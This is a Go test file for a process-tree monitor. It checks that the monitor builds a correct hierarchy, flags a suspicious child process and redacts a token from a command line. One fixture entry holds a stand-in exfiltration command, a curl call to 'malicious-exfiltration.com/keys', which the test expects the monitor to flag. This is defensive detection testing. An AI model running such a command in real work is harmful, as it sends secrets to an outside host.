package process

import (
	"context"
	"runtime"
	"testing"
	"time"
)

func TestBuildProcessTreeAndSuspiciousDetection(t *testing.T) {
	monitor := NewMonitor()

	flatList := []*ProcessNode{
		{
			PID:         100,
			ParentPID:   1,
			Name:        "docker.exe",
			Executable:  "C:\\Program Files\\Docker\\docker.exe",
			CommandLine: "docker build -t app .",
		},
		{
			PID:         101,
			ParentPID:   100,
			Name:        "npm.cmd",
			Executable:  "C:\\Program Files\\nodejs\\npm.cmd",
			CommandLine: "npm run build --token=secret_token_123",
		},
		{
			PID:         102,
			ParentPID:   101,
			Name:        "node.exe",
			Executable:  "C:\\Program Files\\nodejs\\node.exe",
			CommandLine: "node vite build",
		},
		{
			PID:         103,
			ParentPID:   101,
			Name:        "curl.exe",
			Executable:  "C:\\Windows\\System32\\curl.exe",
			CommandLine: "curl http://malicious-exfiltration.com/keys",
		},
	}

	tree := monitor.BuildTree(flatList)

	if tree.TotalProcesses != 4 {
		t.Fatalf("expected 4 processes, got %d", tree.TotalProcesses)
	}

	if tree.SuspiciousCount != 1 {
		t.Errorf("expected 1 suspicious process (curl.exe), got %d", tree.SuspiciousCount)
	}

	// Verify tree hierarchy: root should be docker.exe
	if tree.Root == nil || tree.Root.PID != 100 {
		t.Errorf("expected root process PID 100 (docker.exe), got %+v", tree.Root)
	}

	// Root should have child npm.cmd
	if len(tree.Root.Children) != 1 || tree.Root.Children[0].PID != 101 {
		t.Errorf("expected npm.cmd (101) as child of root, got %+v", tree.Root.Children)
	}

	// npm.cmd should have 2 children: node.exe and curl.exe
	npmNode := tree.Root.Children[0]
	if len(npmNode.Children) != 2 {
		t.Errorf("expected 2 children for npm.cmd, got %d", len(npmNode.Children))
	}

	// Verify secret redaction on npm.cmd command line
	if npmNode.CommandLine == "npm run build --token=secret_token_123" {
		t.Errorf("command line secret was not redacted: %s", npmNode.CommandLine)
	}
}

func TestSnapshotWindowsProcesses(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("skipping Windows process snapshot test on non-windows platform")
	}

	monitor := NewMonitor()
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	procs, err := monitor.SnapshotWindowsProcesses(ctx)
	if err != nil {
		t.Fatalf("SnapshotWindowsProcesses failed: %v", err)
	}

	if len(procs) == 0 {
		t.Errorf("expected active processes from tasklist, got empty slice")
	}
}
